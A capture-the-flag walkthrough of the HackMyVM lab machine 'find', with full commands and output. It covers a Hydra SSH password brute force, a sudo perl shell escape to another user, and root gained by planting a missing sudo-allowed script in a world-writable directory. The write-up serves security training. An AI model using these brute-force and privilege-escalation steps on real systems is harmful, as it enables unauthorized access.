# find

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| find | powerful | Beginner | HackMyVM |

**Summary:** The "find" machine is a beginner-level HackMyVM box running Debian Linux. The attack begins with a standard network and port scan, which reveals an Apache web server on port 80 and an SSH daemon on port 22. Directory enumeration of the web server surfaces a `robots.txt` file containing the cryptic hint "find user :)" and a JPEG image (`cat.jpg`) hidden within the web root. Running `strings` against the image exposes a block of obfuscated text that turns out to be valid Malbolge code, an esoteric programming language. Decoding that Malbolge program using an online interpreter on dCode reveals the string `missyred`, which is a valid system username. From there, Hydra brute-forces the SSH password for `missyred` against the rockyou wordlist in a matter of seconds. Once on the box as `missyred`, a `sudo -l` check shows that the user is permitted to run `/usr/bin/perl` as the user `kings`, a classic GTFOBins vector. Spawning a bash shell through perl escalates to `kings`. As `kings`, another `sudo -l` check reveals that the user may run `/opt/boom/boom.sh` as ALL users with no password required. The `/opt/boom/` directory is world-writable and the script itself does not yet exist, so a malicious `boom.sh` is written, made executable, and executed with sudo to obtain a full root shell. Both the user flag and root flag are then read from disk to confirm full system compromise.

---

## Reconnaissance

### Host Discovery

The engagement started with a PowerShell-based network scanner to identify live hosts on the local subnet `192.168.100.0/24`.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.13 08:00:27:85:03:7C VirtualBox
```

A single VirtualBox-based virtual machine was identified at `192.168.100.13`. The MAC vendor prefix `08:00:27` is a well-known VirtualBox OUI, confirming the target is a local virtual machine.

### Port Scanning

With the target IP confirmed, a full TCP port scan was launched with service version detection and default scripts.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/find]
└─$ nmap -sC -sV -p- -T4 192.168.100.13
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 15:00 WIB
Nmap scan report for TOTOLINK.lan (192.168.100.13)
Host is up (0.057s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6e:f7:90:04:84:0d:cd:1e:5d:2e:da:b1:51:d9:bf:57 (RSA)
|   256 39:5a:66:38:f7:64:9a:94:dd:bc:b6:fb:f8:e7:3f:87 (ECDSA)
|_  256 8c:26:e7:26:62:77:16:40:fb:b5:cf:a6:1c:e0:f6:9d (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.23 seconds
```

Only two ports were open:

Port 22 was running OpenSSH 7.9p1 on Debian 10 (Buster). Port 80 was running Apache httpd 2.4.38, serving the default Debian Apache landing page. The OS fingerprint is consistent with Debian Buster (Debian 10). This is a minimal attack surface, so the HTTP service was the primary focus.

### Web Enumeration

The target IP was stored in a variable for convenience before beginning web directory enumeration.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/find]
└─$ IP=192.168.100.13
```

The first Gobuster pass used the standard `dirb/common.txt` wordlist to identify common paths.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/find]
└─$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.13
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 10701]
/manual               (Status: 301) [Size: 317] [--> http://192.168.100.13/manual/]
/robots.txt           (Status: 200) [Size: 13]
/server-status        (Status: 403) [Size: 279]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

A `robots.txt` file was found. Reading its contents immediately gave the first lead.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/find]
└─$ curl http://$IP/robots.txt
find user :)
```

The message `find user :)` is a deliberate hint from the machine author. It directs the attacker to look for a username somewhere on the server. Rather than a directory exclusion list, the `robots.txt` here is being repurposed as a breadcrumb. This prompted a deeper enumeration pass with a larger wordlist and extension brute-forcing.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/find]
└─$ gobuster dir -u http://$IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,bak,pem,html,zip,jpg,png,js
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.13
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              zip,jpg,txt,php,bak,html,png,js,pem
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/cat.jpg              (Status: 200) [Size: 35137]
/manual               (Status: 301) [Size: 317] [--> http://192.168.100.13/manual/]
/robots.txt           (Status: 200) [Size: 13]
```

A JPEG image named `cat.jpg` was discovered in the web root. Given the `robots.txt` hint to "find user", this image became the primary investigative target.

---

## Steganography and Hidden Data Extraction

The image was downloaded and subjected to multiple forensic analysis techniques to determine whether it contained any hidden data.

### Metadata Inspection with ExifTool

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/find]
└─$ exiftool cat.jpg
ExifTool Version Number         : 13.36
File Name                       : cat.jpg
Directory                       : .
File Size                       : 35 kB
File Modification Date/Time     : 2022:05:10 11:51:14+07:00
File Access Date/Time           : 2026:03:07 15:13:21+07:00
File Inode Change Date/Time     : 2026:03:07 15:13:21+07:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Comment                         : File source: https://commons.wikimedia.org/wiki/File:Cat03.jpg
Image Width                     : 481
Image Height                    : 480
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 481x480
Megapixels                      : 0.231
```

ExifTool revealed a comment linking the image back to a Wikimedia Commons file. No sensitive metadata was found here, the image is a standard 481x480 JPEG. The file modification date of 2022-05-10 is consistent with the machine creation date.

### Steganography Checks

Both StegSeek and Steghide were run to test for password-protected steganographic content embedded within the JPEG.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/find]
└─$ stegseek cat.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.78% (133.1 MB)
[!] error: Could not find a valid passphrase.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/find]
└─$ steghide info cat.jpg
"cat.jpg":
  format: jpeg
  capacity: 2.0 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
steghide: could not extract any data with that passphrase!
```

StegSeek exhausted the entire rockyou wordlist (133.1 MB) without finding a valid passphrase. Steghide confirmed that while the image has 2.0 KB of capacity, no data could be extracted without the correct passphrase. The steganography avenue was therefore ruled out.

### String Extraction, Malbolge Code Discovered

The `strings` utility was used to dump all printable character sequences from the binary image data. This revealed something unusual embedded within the file.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/find]
└─$ strings cat.jpg
JFIF
@File source: https://commons.wikimedia.org/wiki/File:Cat03.jpg
 , #&')*)
-0-(0%()(
((((((((((((((((((((((((((((((((((((((((((((((((((
...
bl&h
it\mMBv
>C<;_"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJ`_dcba`_^]\Uy<XW
VOsrRKPONGk.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONML
KJIHGFEDZY^W\[ZYXWPOsSRQPON0Fj-IHAeR
```

The string at the end of the output, a dense sequence of symbols from the printable ASCII range, is characteristic of Malbolge, an intentionally difficult esoteric programming language designed by Ben Olmstead in 1998. Malbolge programs look like random garbage because every instruction self-modifies after execution. The string extracted from the image is in fact a valid Malbolge program that encodes a meaningful output.

### Decoding the Malbolge Program

The extracted Malbolge code was submitted to the dCode online interpreter at `https://www.dcode.fr/malbolge-language` for execution.

![decode](image.png)

As visible in the screenshot above, the dCode Malbolge Interpreter executed the code and produced the output `missyred` in the Results panel on the left side. This string, previously unknown, is the username to target on the SSH service, which directly answers the `robots.txt` hint "find user :)".

---

## Initial Access

### SSH Brute-Force with Hydra

With the username `missyred` recovered from the Malbolge-encoded string, Hydra was used to brute-force the SSH password using the rockyou wordlist.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/find]
└─$ hydra -l missyred -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-07 15:18:10
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://192.168.100.13:22/
[22][ssh] host: 192.168.100.13   login: missyred   password: i[REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-07 15:18:14
```

Hydra found a valid SSH credential for `missyred` in approximately 4 seconds. The password was a dictionary word found early in the rockyou list. The `-t 4` flag limited concurrent tasks to 4 to avoid triggering SSH connection limits.

### SSH Login and Initial Enumeration

Logging in with the discovered credentials established a foothold as the `missyred` user.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/find]
└─$ ssh missyred@$IP
...
missyred@find:~$ id ; ls -la
uid=1001(missyred) gid=1001(missyred) groups=1001(missyred),1002(user)
total 28
drwxr-xr-x 4 missyred missyred 4096 May 11  2022 .
drwxr-xr-x 4 root     root     4096 May 11  2022 ..
-rw-r--r-- 1 missyred missyred  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 missyred missyred 3526 Apr 18  2019 .bashrc
drwxr-xr-x 3 missyred missyred 4096 May  9  2022 .local
-rw-r--r-- 1 missyred missyred  807 Apr 18  2019 .profile
drwxr-xr-x 2 missyred missyred 4096 May 10  2022 .ssh
```

The home directory for `missyred` is clean, no flags or interesting files here. The user belongs to the `user` group (gid 1002) in addition to their own group. The `/etc/passwd` file was checked to enumerate all shell-enabled accounts on the system.

```bash
missyred@find:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
missyred:x:1001:1001::/home/missyred:/bin/bash
kings:x:1002:1006::/home/kings:/bin/bash
```

Three accounts have valid login shells: `root`, `missyred`, and `kings`. The `kings` user is the next lateral movement target. Listing their home directory shows a user flag that `missyred` cannot read directly due to file permissions.

```bash
missyred@find:~$ ls -la /home/kings
total 28
drwxr-xr-x 3 kings kings 4096 May 11  2022 .
drwxr-xr-x 4 root  root  4096 May 11  2022 ..
-rw-r--r-- 1 kings kings  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 kings kings 3526 Apr 18  2019 .bashrc
drwxr-xr-x 3 kings kings 4096 May 11  2022 .local
-rw-r--r-- 1 kings kings  807 Apr 18  2019 .profile
-rw------- 1 kings kings   33 May 11  2022 user.txt
```

The `user.txt` file is readable only by `kings` (mode `600`). Access to it requires privilege escalation to the `kings` account.

---

## Privilege Escalation, missyred to kings

### Sudo Permissions Enumeration

```bash
missyred@find:~$ which sudo
/usr/bin/sudo
missyred@find:~$ sudo -l
[sudo] password for missyred:
Matching Defaults entries for missyred on find:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User missyred may run the following commands on find:
    (kings) /usr/bin/perl
```

The `sudo` configuration grants `missyred` the ability to execute `/usr/bin/perl` as the user `kings`. This is a textbook GTFOBins privilege escalation vector. The Perl binary is capable of spawning an interactive shell, and since it is being run via `sudo -u kings`, the resulting shell inherits `kings`'s privileges.

### GTFOBins, Perl Sudo Shell Escape

The GTFOBins entry for `perl` under the Sudo category confirms the exact command to use.

![alt text](image-1.png)

As shown in the GTFOBins screenshot above (from `gtfobins.github.io`), the `Sudo` tab for `perl` states: "This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped." The listed payload is `perl -e 'exec "/bin/sh"'`. The actual command used here spawns `/bin/bash` instead of `/bin/sh` for a more interactive session.

```bash
missyred@find:~$ sudo -u kings /usr/bin/perl -e 'exec "/bin/bash"'
kings@find:/home/missyred$ cd
kings@find:~$ id
uid=1002(kings) gid=1006(kings) groups=1006(kings),1005(kingg)
```

The shell successfully spawned as `kings`. The user belongs to their own group `kings` (gid 1006) and also to the `kingg` group (gid 1005). The home directory was confirmed to contain `user.txt`.

```bash
kings@find:~$ ls -la
total 28
drwxr-xr-x 3 kings kings 4096 May 11  2022 .
drwxr-xr-x 4 root  root  4096 May 11  2022 ..
-rw-r--r-- 1 kings kings  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 kings kings 3526 Apr 18  2019 .bashrc
drwxr-xr-x 3 kings kings 4096 May 11  2022 .local
-rw-r--r-- 1 kings kings  807 Apr 18  2019 .profile
-rw------- 1 kings kings   33 May 11  2022 user.txt
```

---

## Privilege Escalation, kings to root

### Sudo Permissions Enumeration for kings

```bash
kings@find:~$ sudo -l
Matching Defaults entries for kings on find:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kings may run the following commands on find:
    (ALL) NOPASSWD: /opt/boom/boom.sh
```

The `kings` user can run `/opt/boom/boom.sh` as **any user** (including root) with **no password required** (`NOPASSWD`). This is an extremely privileged `sudo` rule. The critical question is: does the script exist, and if it does, can it be modified?

```bash
kings@find:~$ file /opt/boom/boom.sh
/opt/boom/boom.sh: cannot open `/opt/boom/boom.sh' (No such file or directory)
kings@find:~$ ls -la /opt
total 8
drwxrwxrwx  2 root root 4096 May 11  2022 .
drwxr-xr-x 18 root root 4096 May 11  2022 ..
```

The script `/opt/boom/boom.sh` does not exist yet, and more importantly, the `/opt` directory has world-writable permissions (`drwxrwxrwx`). This means any user on the system, including `kings`, can create files and directories inside `/opt`. The attack path is clear: create the missing script with malicious content, make it executable, and run it via sudo to obtain a root shell.

### Crafting the Malicious boom.sh

```bash
kings@find:~$ mkdir -p /opt/boom
kings@find:~$ echo '#!/bin/bash' > /opt/boom/boom.sh
kings@find:~$ echo '/bin/bash' >> /opt/boom/boom.sh
kings@find:~$ chmod +x /opt/boom/boom.sh
kings@find:~$ cat /opt/boom/boom.sh
#!/bin/bash
/bin/bash
```

The script was created in three steps. First, `mkdir -p /opt/boom` created the `boom` subdirectory inside the world-writable `/opt`. Then a minimal bash script was written, a shebang line followed by `/bin/bash` to spawn an interactive shell. Finally, the script was made executable with `chmod +x`. The `cat` confirms the contents are exactly as intended.

### Executing for Root Shell

```bash
kings@find:~$ sudo /opt/boom/boom.sh
root@find:/home/kings# cd
root@find:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
find
```

Executing the script via `sudo` (which runs it as root by default when no user is specified and the rule says `ALL`) immediately spawned a bash shell with `uid=0(root)`. The `id`, `whoami`, and `hostname` commands confirm full root access on the `find` machine.

### Flag Collection

```bash
root@find:~# cat /home/kings/user.txt /root/root.txt
f4e[REDACTED]
c8a[REDACTED]
```

Both flags were read in a single command, confirming complete compromise of the machine from the user flag in `/home/kings/user.txt` to the root flag in `/root/root.txt`.

---

## Attack Chain Summary

1. **Reconnaissance**: Network scan with a custom PowerShell script identified the target VM at `192.168.100.13`. Full Nmap scan revealed two open ports: SSH (22) on OpenSSH 7.9p1 and HTTP (80) on Apache 2.4.38 running Debian Buster.

2. **Vulnerability Discovery**: Gobuster enumeration of the web root discovered `/robots.txt` (containing the hint `find user :)`) and `/cat.jpg`. Running `strings` against the downloaded JPEG revealed embedded Malbolge code hidden within the image binary data. Decoding the Malbolge program via the dCode online interpreter produced the plaintext string `missyred`, a valid system username.

3. **Exploitation**: Hydra brute-forced the SSH password for `missyred` using the rockyou wordlist, finding valid credentials within seconds. SSH access was then established as `missyred`, granting initial foothold on the system.

4. **Internal Enumeration**: Post-login enumeration revealed three shell-enabled accounts (`root`, `missyred`, `kings`), the user flag at `/home/kings/user.txt` (readable only by `kings`), and a `sudo` rule granting `missyred` the ability to run `/usr/bin/perl` as `kings`.

5. **Privilege Escalation (missyred to kings)**: Using the GTFOBins technique for `perl` under sudo, the command `sudo -u kings /usr/bin/perl -e 'exec "/bin/bash"'` spawned an interactive bash shell as the `kings` user, granting access to `user.txt`.

6. **Privilege Escalation (kings to root)**: A second `sudo -l` check revealed that `kings` could execute `/opt/boom/boom.sh` as ALL users with no password. The script did not exist, and the parent directory `/opt` was world-writable. A malicious `boom.sh` containing `/bin/bash` was created and made executable. Running `sudo /opt/boom/boom.sh` delivered a full root shell, completing the privilege escalation chain and providing access to `root.txt`.
